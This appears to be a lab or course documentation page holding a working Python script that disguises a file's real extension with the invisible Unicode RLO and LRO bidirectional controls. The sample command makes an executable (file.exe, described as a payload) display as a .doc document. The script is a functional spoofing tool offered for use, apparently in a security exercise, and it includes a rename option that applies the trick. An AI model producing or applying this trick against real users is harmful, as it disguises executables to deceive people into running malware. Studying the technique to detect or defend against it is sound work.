---
title: "Lro Rlo File Ext"
weight: 1
# bookFlatSection: false
# bookToc: true
# bookHidden: false
# bookCollapseSection: false
# bookComments: false
# bookSearchExclude: false
# bookHref: ''
# bookIcon: ''
---


```python
#!/usr/bin/env python3
"""Build the RLO/LRO filename pattern shown in the M2 lab writeup."""

from __future__ import annotations

import argparse
import json
from pathlib import Path

RLO = "\u202e"
LRO = "\u202d"


def build_name(display_name: str, extension: str, prefix: str | None) -> tuple[str, str]:
    if not extension.startswith(".") or len(extension) < 2:
        raise ValueError("--extension must include its leading dot, for example .exe")

    if prefix is None:
        marker_at = display_name.lower().find(extension.lower())
        if marker_at <= 0:
            raise ValueError(
                f"{display_name!r} has no {extension!r} inside it; supply --prefix "
                "whose text is the start of the display name and ends in the real extension"
            )
        prefix = display_name[: marker_at + len(extension)]

    if not display_name.startswith(prefix):
        raise ValueError("--prefix must match the beginning of the displayed name")
    if not prefix.lower().endswith(extension.lower()):
        raise ValueError("--prefix must end with the real extension")

    remainder = display_name[len(prefix) :]
    if not remainder:
        raise ValueError("the prefix must leave some displayed text after it")

    # RLO reverses the remainder for display. LRO then starts a left-to-right
    # run containing the prefix. That prefix is last in the stored name, so its
    # final extension remains the file's actual extension.
    stored_name = RLO + remainder[::-1] + LRO + prefix
    return stored_name, prefix


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Preview or apply the M2 lab RLO/LRO filename pattern."
    )
    parser.add_argument("source", type=Path, help="Existing file, such as payload.exe")
    parser.add_argument("display_name", help="Name you want the UI to display")
    parser.add_argument(
        "--prefix",
        help="Displayed starting text ending with the source file's real extension; inferred when possible",
    )
    parser.add_argument("--apply", action="store_true", help="Rename the source file")
    parser.add_argument(
        "--literal",
        action="store_true",
        help="Print the raw Unicode name too; bidi controls are invisible",
    )
    args = parser.parse_args()

    if not args.source.is_file():
        parser.error(f"source file does not exist or is not a regular file: {args.source}")
    if "/" in args.display_name or "\\" in args.display_name:
        parser.error("display_name must be a filename, without directory separators")

    extension = args.source.suffix
    if not extension:
        parser.error("source file has no extension to preserve")

    try:
        stored_name, prefix = build_name(args.display_name, extension, args.prefix)
    except ValueError as exc:
        parser.error(str(exc))

    remainder = args.display_name[len(prefix) :]
    destination = args.source.with_name(stored_name)
    print(f"Displayed name: {args.display_name}")
    print(f"Source file:    {args.source}")
    print(f"Real extension: {extension}")
    print(f"Split:          {prefix!r} + {remainder!r}")
    print(f"Escaped name:   {json.dumps(stored_name, ensure_ascii=True)}")
    print("Controls:       U+202E RLO, then U+202D LRO")
    if args.literal:
        print("Literal destination name follows; bidi controls are invisible:")
        print(stored_name)

    if args.apply:
        if destination.exists():
            parser.error(f"destination already exists: {destination!s}")
        args.source.rename(destination)
        print(f"Renamed to:     {destination}")
    else:
        print("Preview only. Add --apply to rename the source file.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

```bash
python script.py file.exe 'CSG2025.Exercise.doc' --apply
```